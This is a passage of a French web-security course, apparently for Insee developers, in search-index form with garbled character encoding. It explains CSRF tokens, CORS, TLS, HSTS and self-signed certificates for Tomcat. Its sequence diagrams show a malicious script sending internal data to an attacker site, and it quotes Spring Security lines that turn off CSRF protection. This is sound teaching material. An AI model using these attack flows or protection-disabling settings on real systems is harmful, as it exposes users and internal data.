\u0026lt;/script\u0026gt;  Le script va simuler un clic dans le formulaire avec les options que j\u0026rsquo;ai choisi. L\u0026rsquo;admin Ã©tant connectÃ© prÃ©alablement, le clic va bien Ãªtre Ã©xÃ©cutÃ© en tant que lui-mÃªme (le navigateur va lÃ©gitimement envoyer le cookie de session, on est sur le bon domaine, en https, etc)\nOn parle d\u0026rsquo;une attaque de type CSRF ou Cross-Site Request Forgery\n  scÃ©nario : Le pirate souhaite effectuer une opÃ©ration en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous Ãªtes authentifiÃ© sur le cible cible, l\u0026rsquo;action s\u0026rsquo;effectue en votre nom. La vulnÃ©rabilitÃ© existe sur les authentifications basÃ©es sur des cookies ou sur des authentifications sso.\n  On ne cherche pas Ã  empÃ©cher une acton malveillante en soi\n  On cherche Ã  empÃ©cher un utilisateur de faire une opÃ©ration lÃ©gitime mais forcÃ©e par le pirate. On veut s\u0026rsquo;assurer que l\u0026rsquo;utilisateur rÃ©alise son opÃ©ration en pleine conscience.\n  Protections :\n  VÃ©rifier les entrÃ©es utilisateurs ?\n  Ici, l\u0026rsquo;action Ã  bloquer est lÃ©gitime\u0026hellip;\n  Faire en sorte qu\u0026rsquo;Ã  chaque appel d\u0026rsquo;un vrai formulaire du site, un jeton Ã  usage unique soit ajoutÃ©. Le serveur pourra ainsi s\u0026rsquo;assurer de la cohÃ©rence de la requÃªte\n  Des bibliothÃ¨ques peuvent aider Ã  cette protection : Spring security, pac4j\n  Il faut alors ajouter dans chaque formulaire le jeton en hidden\n  \u0026lt;form action=\u0026quot;/cible-du-form\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;select\u0026gt;\u0026lt;option\u0026gt;ajouter\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;supprimer\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt; \u0026lt;select\u0026gt;\u0026lt;option\u0026gt;eleve\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;allUsers\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;${_csrf.parameterName}\u0026quot; value=\u0026quot;${_csrf.token}\u0026quot;/\u0026gt; \u0026lt;button type=\u0026quot;submit\u0026quot;\u0026gt;Je sais ce que je fais\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt;   Principe tout POST ne contenant pas ce paramÃ¨tre se soldera par une 403 Potentiellement pas nÃ©cessaire sur tout le site Pour lever la protection en spring security:  http.csrf().ignoringAntMatchers(\u0026quot;/saml/**\u0026quot;); // l'ignorer sur certaines url http.csrf().disable(); // l'ignorer complÃ¨tement  CSRF et application stateless # La protection prÃ©cÃ©dente fonctionne dans un mode STATEFUL, c\u0026rsquo;est Ã  dire que l\u0026rsquo;algorithmique impose le maintien d\u0026rsquo;une session, dans laquelle on peut stocker des Ã©lements d\u0026rsquo;Ã©tat permettant de suivre le dÃ©roulÃ© logiques des actions de l\u0026rsquo;utilisateur.\nLes architectures proposent cenpendant de plus en plus des situation STATELESS, typiquement l\u0026rsquo;application javascript et son api sont stateless. On peut introduire un peu de stateful dans le cadre de l\u0026rsquo;appli js en local dans le navigateur, c\u0026rsquo;est plutÃ´t proscrit cÃ´tÃ© API.\nLe formulaire est cÃ´tÃ© JS, la protection prÃ©cÃ©dente n\u0026rsquo;a plus aucun sens puisque l\u0026rsquo;api ne peux pas gÃ©rer de contrÃ´le d\u0026rsquo;Ã©tat.\nSi on essaie de reproduire l\u0026rsquo;attaque prÃ©cÃ©dente, on va Ã©crire un script malveillant qui attaque directement l\u0026rsquo;API. Dans le cadre d\u0026rsquo;attaque cherchant Ã  usurper un individu privilÃ©iÃ©, Ã  noter qu\u0026rsquo;il n\u0026rsquo;est pas censÃ© y avoir de gestion de cookie, donc cela implique d\u0026rsquo;avoir rÃ©cupÃ©rÃ© un jeton authentifiant de l\u0026rsquo;utilisateur\nCependant ce scÃ©nario d\u0026rsquo;attaque sert aussi Ã  rÃ©cupÃ©rer une info disponible sur un rÃ©seau interne sans authentification par exemple\nsequenceDiagram actor U as Alphonse participant A as App interne participant S as App internet malveillante U-\u0026gt;\u0026gt;S: Connexion site attaquant S-\u0026gt;\u0026gt;U: recup app js maveillante U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; GET /app-intenre/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: GET /app-intenre/donnee-sensible A-\u0026gt;\u0026gt;U: donnee-sensible note over U,S: script \u0026lt;br/\u0026gt; envoie donnee-sensible site attaquant U-\u0026gt;\u0026gt;S: donnee-sensible  Pour contrer cette attaque, on va plutÃ´t s\u0026rsquo;interesser Ã  la source du script.\nLa protection CORS # CORS = Cross Over Resource Sharing\nMÃªme si l\u0026rsquo;Ã©xÃ©cution du script se passe cÃ´tÃ© navigateur, on peut quand mÃªme contrÃ´ler la source du script Ã©xÃ©cutÃ©.\nLes navigateurs envoient un entÃªte Origincontenant l\u0026rsquo;exact domaine source du script qui Ã©xÃ©cute la requÃªte HTTP.\nLes navigateurs envoient systÃ©matiquement et automatiquement l\u0026rsquo;entÃªte Origin (Ã  moins d\u0026rsquo;utiliser Netscape 8 ou IE 6)\nLe navigateur n\u0026rsquo;autorise pas la modification de cet entete par script\nsequenceDiagram actor U as Alphonse participant A as App interne participant S as App internet malveillante U-\u0026gt;\u0026gt;S: Connexion site attaquant S-\u0026gt;\u0026gt;U: recup app js maveillante U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; GET /app-intenre/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: GET /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com  Au sens CORS, une source est\n  un protocole\n  un nom de domaine\n  un port\n  http://localhost:8080 n\u0026rsquo;est pas le mÃªme domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore diffÃ©rent\n  Comment rÃ©agit app-interne ?\nCas 1 : les devs de app-interne ne savent pas ce qu\u0026rsquo;est CORS\n Aucun controle de l\u0026rsquo;en-tete si un traitement est fait en amont de renvoyer donnÃ©e-sensible, il est effectuÃ© Le site renvoie donnÃ©e-sensible  Le navigateur lit la rÃ©ponse AVANT de la fournir au script PAS d\u0026rsquo;entete CORS =\u0026gt; le navigateur bloque la rÃ©ponse\n ouf\u0026hellip;  =\u0026gt; Par dÃ©faut la protection CORS est bloquante\n Petit problÃ¨me, et si le traitement prÃ©-envoi donnÃ©e-sensible n\u0026rsquo;est pas idempotent ? L\u0026rsquo;action est quand mÃªme rÃ©alisÃ©e  Les navigateurs ont ajoutÃ©s un \u0026ldquo;pre-flight\u0026rdquo; sur les requÃªtes Ã©xÃ©cutÃ©es par script. D\u0026rsquo;aprÃ¨s la spec, le pre-flight n\u0026rsquo;est rÃ©alisÃ© pour toute requÃªte sauf GET et POST \u0026ldquo;complexe\u0026rdquo;. En pratique les navigateurs ont tendance Ã  le systÃ©matiser. La logique initiale Ã©tant qu\u0026rsquo;une action non idempotente n\u0026rsquo;est pas censÃ©e Ãªtre implÃ©mentÃ©e sur un GET.\nLe navigateur va envoyer d\u0026rsquo;abord un \u0026ldquo;OPTION\u0026rdquo; sur la requÃªte demandÃ©e et controler la rÃ©ponse =\u0026gt; on bloque en amont l\u0026rsquo;Ã©ventuel traitement.\nsequenceDiagram actor U as Alphonse participant A as App interne participant S as App internet malveillante U-\u0026gt;\u0026gt;S: Connexion site attaquant S-\u0026gt;\u0026gt;U: recup app js maveillante U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; PUT /app-intenre/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: OPTION /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com A-\u0026gt;\u0026gt;U: rÃ©ponse note over A,U: pas d\u0026#39;entete spÃ©cifique CORS \u0026lt;br/\u0026gt; =\u0026gt; blocage de l\u0026#39;envoi rÃ©el  Cas 2 : Les devs ont pris en compte le besoin d\u0026rsquo;Ãªtre appelÃ© depuis un script\nCas d\u0026rsquo;une requete illÃ©gitime\nsequenceDiagram actor U as Alphonse participant A as App interne participant S as App internet malveillante U-\u0026gt;\u0026gt;S: Connexion site attaquant S-\u0026gt;\u0026gt;U: recup app js maveillante U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; GET /app-intenre/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: GET /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com A-\u0026gt;\u0026gt;A: Controle de l\u0026#39;entete Origin si existant note over A: l\u0026#39;entete Origin n\u0026#39;est pas autorisÃ© A-\u0026gt;\u0026gt;U: 403 c\u0026#39;est non ! note over A,U: pas d\u0026#39;entete spÃ©cifique CORS \u0026lt;br/\u0026gt; =\u0026gt; blocage de l\u0026#39;envoi rÃ©el U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; PUT /app-intenre/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: OPTION /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com A-\u0026gt;\u0026gt;A: Controle de l\u0026#39;entete Origin si existant note over A: l\u0026#39;entete Origin n\u0026#39;est pas autorisÃ© A-\u0026gt;\u0026gt;U: 403 c\u0026#39;est non ! note over A,U: pas d\u0026#39;entete spÃ©cifique CORS \u0026lt;br/\u0026gt; =\u0026gt; blocage de l\u0026#39;envoi rÃ©el  Remarque : Dans le cas de blocage, le navigateur rÃ©pond au script comme un Ã©chec de connexion (il ne prÃ©cise pas que c\u0026rsquo;est un problÃ¨me de CORS) Le script ne fait pas la difference entre un echec de connexion et une erreur cors On peut cependant voir l\u0026rsquo;erreur loggÃ©e\nCas d\u0026rsquo;une requÃªte lÃ©gitime\nsequenceDiagram actor U as Alphonse participant A as App interne participant S as App interne frontend U-\u0026gt;\u0026gt;S: Connexion frontend S-\u0026gt;\u0026gt;U: recup app lÃ©gitime U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; GET /app-intenre/donnee-sensible U-\u0026gt;\u0026gt;A: GET /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://app-interne-frontend.com A-\u0026gt;\u0026gt;A: Controle de l\u0026#39;entete Origin si existant note over A: l\u0026#39;entete Origin est autorisÃ© A-\u0026gt;\u0026gt;U: 200 donnÃ©e sensible \u0026lt;br\u0026gt; Access-Control-Allow-Origin: https://app-interne-frontend.com note over A,U: entete CORS OK ! \u0026lt;br/\u0026gt; =\u0026gt; transfert au script U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; PUT /app-intenre/donnee-sensible U-\u0026gt;\u0026gt;A: OPTION /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://app-interne-frontend.com A-\u0026gt;\u0026gt;A: Controle de l\u0026#39;entete Origin si existant note over A: l\u0026#39;entete Origin est autorisÃ© A-\u0026gt;\u0026gt;U: 200 ok \u0026lt;br/\u0026gt; Access-Control-Allow-Origin: https://app-interne-frontend.com note over A,U: entete CORS ok ! \u0026lt;br/\u0026gt; =\u0026gt; Ã©xÃ©cution de la vraie requÃªte U-\u0026gt;\u0026gt;A: PUT /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://app-interne-frontend.com A-\u0026gt;\u0026gt;U: 204 c\u0026#39;est fait ! \u0026lt;br/\u0026gt; Access-Control-Allow-Origin: https://app-interne-frontend.com  Cas ou Ã§a doit marcher mais on a eu la flemme\nsequenceDiagram actor U as Alphonse participant A as App interne participant S as App internet malveillante U-\u0026gt;\u0026gt;S: Connexion site attaquant S-\u0026gt;\u0026gt;U: recup app js maveillante U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; GET /app-intenre/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: GET /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com A-\u0026gt;\u0026gt;A: PAS de controle de l\u0026#39;entete Origin A-\u0026gt;\u0026gt;U: 200 donnÃ©e sensible \u0026lt;br/\u0026gt; Access-Control-Allow-Origin: * note over A,U: entete CORS gÃ©nÃ©rique \u0026lt;br/\u0026gt; =\u0026gt; transmission au script U-\u0026gt;\u0026gt;U: exÃ©cution script note over U,S: script \u0026lt;br/\u0026gt; PUT /app-interne/donnee-sensible \u0026lt;br/\u0026gt; donnÃ©e sensible sans authent \u0026lt;br/\u0026gt; parce que on est tranquille l\u0026#39;app est interne U-\u0026gt;\u0026gt;A: OPTION /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com A-\u0026gt;\u0026gt;A: PAS de Controle de l\u0026#39;entete Origin A-\u0026gt;\u0026gt;U: 403 Ok \u0026lt;br/\u0026gt; Access-Control-Allow-Origin: * note over A,U: entete gÃ©nÃ©rique CORS \u0026lt;br/\u0026gt; =\u0026gt; Ã©xÃ©cution de la vraie requÃªte U-\u0026gt;\u0026gt;A: PUT /app-intrne/donnee-sensible \u0026lt;br/\u0026gt; Origin: https://site-pirate.com A-\u0026gt;\u0026gt;U: 204 c\u0026#39;est fait ! \u0026lt;br/\u0026gt; Access-Control-Allow-Origin: *  La requÃªte ne fonctionnera que si le site externe renvoit un entÃªte Access-Control-Allow-Origin correspond au domaine du site source -- Gestion des erreurs :\n Pour debugger, la console du navigateur vous prÃ©vient que la rÃ©ponse a Ã©tÃ© bloquÃ©e  Test :\n\u0026lt;script\u0026gt; var testCors = function () { var req = new XMLHttpRequest() req.open('GET', 'https://insee.fr/fr/accueil', false); req.send(); } \u0026lt;script\u0026gt; \u0026lt;button onClick=\u0026quot;testCors();\u0026quot;\u0026gt;Test CORS KO\u0026lt;/button\u0026gt;   var testCors = function () { var req = new XMLHttpRequest() req.open('GET', 'https://insee.fr/fr/accueil', false); req.send(); }  Test CORS KO\n  Attention Ã  l\u0026rsquo;autorisation globale (elle peut parfois Ãªtre nÃ©cessaire cependant) : Access-Control-Allow-Origin: *\n  L\u0026rsquo;idÃ©al est de controler cÃ´tÃ© serveur l\u0026rsquo;entete \u0026ldquo;Origin\u0026rdquo; et de personnaliser l\u0026rsquo;entete \u0026ldquo;Access-Control-Allow-Origin\u0026rdquo; si on accepte\n  Le dÃ©tails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS\n  Il faut garder Ã  l\u0026rsquo;esprit que CORS est une sÃ©curitÃ© cÃ´tÃ© client pour l\u0026rsquo;empÃ©cher de faire n\u0026rsquo;importe quoi malgrÃ© lui : fournir Ã  un script une information que le serveur n\u0026rsquo;a pas prÃ©vu d\u0026rsquo;Ãªtre utilisÃ©e par un script.\n  "}).add({id:8,href:"/docs/https/fonctionnement/",title:"Fontionnement de https",description:"Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes donnÃ©es Ã©changÃ©es sont en clair Protocole SSL ou TLS (le nom dÃ©pend de la version) : gestion d\u0026rsquo;un tunnel sÃ©curisÃ© Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sÃ©curiser simplement en s\u0026rsquo;Ã©changeant dans un tunnel SSL HTTPS = HTTP + SSL  Proposer HTTPS sur un serveur #  Avoir un listener dÃ©diÃ© au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clÃ© privÃ©e/clÃ© publique  Echange sÃ©curisÃ© #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clÃ© symÃ©trique Il existe des mÃ©thode pour communiquer sur un rÃ©seau en clair une clÃ© symÃ©trique secrÃ¨te, qui sera en fait partiellement gÃ©nÃ©rÃ© par les deux parties (Algorithme de Diffie-Hellman)  sequenceDiagram participant C as TLS Client participant S as TLS Serveur C-\u0026gt;\u0026gt;S: Client Hello note over C,S: Bonjour, \u0026lt;br/\u0026gt; je supporte les versions de TLS \u0026lt;br/\u0026gt; et les algorithmes suivants : \u0026lt;br/\u0026gt; .",content:"Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes donnÃ©es Ã©changÃ©es sont en clair Protocole SSL ou TLS (le nom dÃ©pend de la version) : gestion d\u0026rsquo;un tunnel sÃ©curisÃ© Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sÃ©curiser simplement en s\u0026rsquo;Ã©changeant dans un tunnel SSL HTTPS = HTTP + SSL  Proposer HTTPS sur un serveur #  Avoir un listener dÃ©diÃ© au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clÃ© privÃ©e/clÃ© publique  Echange sÃ©curisÃ© #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clÃ© symÃ©trique Il existe des mÃ©thode pour communiquer sur un rÃ©seau en clair une clÃ© symÃ©trique secrÃ¨te, qui sera en fait partiellement gÃ©nÃ©rÃ© par les deux parties (Algorithme de Diffie-Hellman)  sequenceDiagram participant C as TLS Client participant S as TLS Serveur C-\u0026gt;\u0026gt;S: Client Hello note over C,S: Bonjour, \u0026lt;br/\u0026gt; je supporte les versions de TLS \u0026lt;br/\u0026gt; et les algorithmes suivants : \u0026lt;br/\u0026gt; .......... S-\u0026gt;\u0026gt;C: Server Hello note over C,S: Bonjour, \u0026lt;br/\u0026gt; parmi les versions et algorithme que je supporte, \u0026lt;br/\u0026gt; nous allons utiliser TLS 1.2 et cet algorithme : \u0026lt;br/\u0026gt; TLS_DHE_RSA_WITH_AES_256_CBC_SHA note over C,S: Voici mon certificat : ....... opt note over C,S: J\u0026#39;aurai besoin d\u0026#39;un certificat Ã  ton nom \u0026lt;br/\u0026gt; pour t\u0026#39;authentifier end C-\u0026gt;\u0026gt;C: Controle du certificat note over C: Nom valide ? \u0026lt;br/\u0026gt; Date valide ? \u0026lt;br/\u0026gt; AC reconnue ? C-\u0026gt;\u0026gt;S: PrÃ©paration clÃ© (Diffie-Hellman) note over C,S: chiffrÃ©e avec clÃ© publique serveur S-\u0026gt;\u0026gt;S: DÃ©chiffrement avec clÃ© privÃ©e note over S: Fait office de challenge response opt S-\u0026gt;\u0026gt;S: Controle Certif client le cas Ã©chÃ©ant S-\u0026gt;\u0026gt;C: Challenge C-\u0026gt;\u0026gt;S: Challenge response end S-\u0026gt;\u0026gt;C: Finalisation Diffie-Hellman note over C,S: Le client et le serveur \u0026lt;br/\u0026gt; se sont partagÃ© une clÃ© symÃ©trique \u0026lt;br/\u0026gt; Ã  usage unique Ã  cette communication C-\u0026gt;\u0026gt;S: OK, next encrypted S-\u0026gt;\u0026gt;C: OK, next encrypted loop C-\u0026gt;\u0026gt;S: encrypted {get /resource/} S-\u0026gt;\u0026gt;C: encrypted {reponse HTTP} end  La clÃ© symÃ©trique est jetable, non stockÃ©e en dehors de cette Ã©change, elle ne peut donc pas Ãªtre compromise par la suite. On parle de confidentialitÃ© persistente ou PFS (Perfect Forward Secrecy)\nControle d\u0026rsquo;identitÃ© et autoritÃ© de confiance #  A quoi sert la clÃ© asymÃ©trique alors ? ProblÃ¨me du \u0026ldquo;Man in the middle\u0026rdquo;  \u0026ldquo;Information invisible par un tiers\u0026rdquo;\u0026hellip; Encore faut il maÃ®triser les deux parties Le client doit savoir qui il est en train de contacter Le serveur propose un certificat contenant principalement son nom : l\u0026rsquo;url que l\u0026rsquo;utilisateur a demandÃ© sa clÃ© publique la signature de ces informations par une autoritÃ© de confiance    L\u0026rsquo;autoritÃ© de confiance ?\n C\u0026rsquo;est un organisme qui signe avec sa clÃ© privÃ©e les informations du serveur On peut donc vÃ©rifier avec la clÃ© publique de l\u0026rsquo;AC si informations et signature correspondent Pour rÃ©cupÃ©rer la clÃ© publique de l\u0026rsquo;AutoritÃ© de confiance, on consulte son\u0026hellip; Certificat ! \u0026hellip; Mais comment vÃ©rifier son certificat ? Le certificat d\u0026rsquo;une AC est autosignÃ©e, le navigateur est configurÃ© pour accepter un certain nombre L\u0026rsquo;insee est une AC reconnue en interne uniquement Les applis Internet sont signÃ©es par une AC externe reconnue dans le monde entier (intÃ©grÃ©e sur les navigateurs connus)  DÃ©lÃ©guer HTTPS #   L\u0026rsquo;application ne gÃ¨re pas le HTTPS, c\u0026rsquo;est le serveur applicatif (tomcat) ou un Ã©quipement rÃ©seau supÃ©rieur qui en a la charge\n  L\u0026rsquo;application peut imposer l\u0026rsquo;utilisation du HTTPS\n  Dans tous les cas c\u0026rsquo;est le serveur applicatif (tomcat) qui a la charge de dÃ©terminer si la connexion entrante est sÃ©curisÃ©e\n  Cas direct : c\u0026rsquo;est tomcat qui gÃ¨re lui mÃªme la connexion ssl\n  Cas indirect : tomcat ne gÃ¨re pas de connexion HTTPS mais il sait que la connexion initiale est en HTTPS (cas d\u0026rsquo;un reverse proxy)\n  Si le connecteur gÃ¨re la connexion ssl ou qu\u0026rsquo;il est dÃ©diÃ© Ã  recevoir des connexions sÃ©curisÃ©es, on peut directement le spÃ©cifier sÃ©curisÃ©.\n  Sinon, il va falloir dÃ©finir un profil de requÃªtes sÃ©curisÃ©es\n  RÃ©partiteur de charge dÃ©chiffrant #  Architecture Load Balancer qui porte les certificats (et donc gÃ¨re la connexion HTTPS) Le load balancer dÃ©chiffre et transmet une requÃªte HTTP (en clair) au serveur applicatif portant l\u0026rsquo;application  Transfert de l\u0026rsquo;information HTTPS\n  Pour savoir que la requÃªte initiale est en HTTPS, le load balancer ajoute un entÃªte \u0026ldquo;X-Forwarded-Proto: https\u0026rdquo;\n  On va ensuite configurer notre serveur applicatif (tomcat) pour que la lecture de cet entÃªte signifie \u0026ldquo;La connexion initiale Ã©tait sÃ©curisÃ©\u0026rdquo;\n  \u0026lt;Valve className=\u0026quot;org.apache.catalina.connector.RemoteIpValve\u0026quot; protocolHeader=\u0026quot;X-Forwarded-Proto\u0026quot; /\u0026gt;   Une valve Tomcat est une classe exÃ©cutÃ©e (invoke()) Ã  l\u0026rsquo;arrivÃ©e de chaque requÃªte. C\u0026rsquo;est le mÃªme fonctionnement que les filtre JavaEE/JakartaEE\n Vraiment forcer le HTTPS #  Niveau applicatif pour controle Ã©ventuellement Niveau Frontal (Load Balancer) : Ã©couter en http sur le port 80 mais uniquement pour rediriger vers https DÃ©claratif Indiquer au navigateur de ne plsu utiliser que HTTPS : en-tÃªte HSTS  Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot;  La configuration ne sera activÃ©e par le navigateur que s\u0026rsquo;il y a eu une premiÃ¨re fois une commication sÃ©curisÃ©e correctement ! =\u0026gt; Validation ok du certificat\nLe truststore # On va spÃ©cifier un peu plus l\u0026rsquo;Ã©tape \u0026ldquo;VÃ©rification du certificat serveur\u0026rdquo;\n  Mon application doit se connecter Ã  une autre application (web-service)\n  Je souhaite que cet appel soit en https (au fond justifiÃ© que si la connexion entre les deux serveurs passent par Internet)\n  Lors d\u0026rsquo;une connexion HTTPS, Java vÃ©rifie si le certificat distant est valide\n  C\u0026rsquo;est ce que fait le navigateur quand on se connecte Ã  un site\n  Si le certificat n\u0026rsquo;est pas valide (expirÃ©, non associÃ© au domaine, non signÃ© par une autoritÃ© de confiance), le navigateur me le signale et je choisit de prendre le risque ou non de me connecter au site.\n  Dans l\u0026rsquo;appli, Java refusera systÃ©matiquement la connexion\n  Date d\u0026rsquo;expiration, mauvais nom : je ne peux rien faire, il faut que le certificat soit cohÃ©rent\n  AutosignÃ© ? Je peux dire Ã  Java que le signataire du certificat est valide, en d\u0026rsquo;autres termes, je lui dÃ©finis une autoritÃ© de confiance\n  (Il existe la possibilitÃ© de crÃ©er une classe faisant que Java ne fait plus aucun contrÃ´le sur le certificat mais c\u0026rsquo;est mal)\n  Il faut crÃ©er un truststore contenant l\u0026rsquo;ensemble des certificats Ã  valider (= ce que l\u0026rsquo;on considÃ¨re AC)\n  Https sur une application javascript #  On peut toujours dÃ©lÃ©guer le https Ã  un Ã©quipement frontal rÃ©seau A noter que l\u0026rsquo;Ã©change sÃ©curisÃ© permet donc ici de garantir l\u0026rsquo;Ã©change correcte du code source, il est donc indispensable que l\u0026rsquo;utilisateur soit redirigÃ© au plus tÃ´t vers https  On peut Ã©ventuellement forcer le https au sein de l\u0026rsquo;application, mÃªme si c\u0026rsquo;est un peu tard\u0026hellip;\n L\u0026rsquo;application s\u0026rsquo;Ã©xÃ©cute chez le client, pour forcer le https, il faut donc raisonner cÃ´tÃ© client Si l\u0026rsquo;application JS veut s\u0026rsquo;assurer de passer en HTTPS, elle doit vÃ©rifier le window.location du client et Ã©ventuellement le rediriger.  if ( typeof window !== 'undefined' \u0026amp;\u0026amp; window.location \u0026amp;\u0026amp; window.location.protocol === 'http:' ) { window.location.href = window.location.href.replace( /^http(?!s)/, 'https' ); }  Pour lancer une application \u0026ldquo;create-react-app\u0026rdquo; en https en local (par defaut http) :\n Au lieu de npm start Lancer set HTTPS=true\u0026amp;\u0026amp;npm start  Https sur les application javascript : cas du back-end mal signÃ© Un front-end JavaScript effectue des appels Ã  son backend.\nDans la pratique, c\u0026rsquo;est le navigateur qui effectue ces requetes, et si le certificat du backend ne convient pas au navigateur, la requete va Ãªtre rejetÃ©e.\n Solution 1 : Faire en sort que le backend ait un certificat signÃ© par l\u0026rsquo;Insee Solution 2 : se connecter manuellement une fois au backend, accepter l\u0026rsquo;alerte de sÃ©curitÃ© du navigateur  "}).add({id:9,href:"/docs/https/pratique/",title:"Mise en pratique de https",description:"Comment faire en local\n Il n\u0026rsquo;est pas nÃ©cessaire d\u0026rsquo;avoir un certificat signÃ© par une autoritÃ© de confiance Un certificat autosignÃ© suffit : c\u0026rsquo;est un certificat \u0026ldquo;localhost\u0026rdquo; signÃ© par \u0026ldquo;localhost\u0026rdquo;  GÃ©nÃ©rer un certificat # Les Ã©tapes :\n GÃ©nÃ©rer une clÃ© privÃ©e Calculer la clÃ© publique Ã  partir de la clÃ© privÃ©e Enrober la clÃ© publique dans une demande de certificat Signer la demande de certificat (facultatif) GÃ©nÃ©rer le bon format d\u0026rsquo;Ã©change  Qui signe ?",content:"Comment faire en local\n Il n\u0026rsquo;est pas nÃ©cessaire d\u0026rsquo;avoir un certificat signÃ© par une autoritÃ© de confiance Un certificat autosignÃ© suffit : c\u0026rsquo;est un certificat \u0026ldquo;localhost\u0026rdquo; signÃ© par \u0026ldquo;localhost\u0026rdquo;  GÃ©nÃ©rer un certificat # Les Ã©tapes :\n GÃ©nÃ©rer une clÃ© privÃ©e Calculer la clÃ© publique Ã  partir de la clÃ© privÃ©e Enrober la clÃ© publique dans une demande de certificat Signer la demande de certificat (facultatif) GÃ©nÃ©rer le bon format d\u0026rsquo;Ã©change  Qui signe ?\n Une autoritÃ© payante Let\u0026rsquo;s encrypt Nous-mÃªme dans le cadre de l\u0026rsquo;exercice ! Certifcat dit autosignÃ©, ici gÃ©nÃ©rÃ© pour localhost, signÃ© par localhost  # On gÃ©nÃ¨re une clÃ© privÃ©e openssl genrsa 2048 \u0026gt; server.key  # On gÃ©nÃ¨re la clÃ© publique associÃ© Ã  la clÃ© privÃ©e, et on prÃ©pare la demande de certificat openssl req -new -key server.key -out server.csr  \u0026gt; Country Name (2 letter code) [AU]:FR \u0026gt; State or Province Name (full name) [Some-State]:France \u0026gt; Locality Name (eg, city) []:Paris \u0026gt; Organization Name (eg, company) [Internet Widgits Pty Ltd]:Insee \u0026gt; Organizational Unit Name (eg, section) []:CNIP \u0026gt; Common Name (e.g. server FQDN or YOUR name) []:localhost \u0026gt; Email Address []: \u0026gt; Please enter the following 'extra' attributes \u0026gt; to be sent with your certificate request \u0026gt; A challenge password []: \u0026gt; An optional company name []:  # On fait signer la demande par l'AC qui ici est localhost lui-mÃªme openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt  # Si on veut transformer en keystore openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -passout pass:changeit  Installation sur tomcat # Configuration des ports d\u0026rsquo;Ã©coute : dans le server.xml :\nAjout d\u0026rsquo;un connecteur SSL #  tomcat \u0026lt;=9  \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11NioProtocol\u0026quot; maxThreads=\u0026quot;150\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; keystoreFile=\u0026quot;${catalina.home}/conf/ssl/server.p12\u0026quot; keystoreType=\u0026quot;pkcs12\u0026quot; keystorePass=\u0026quot;changeit\u0026quot; /\u0026gt;   tomcat \u0026gt;=10  \u0026lt;Connector 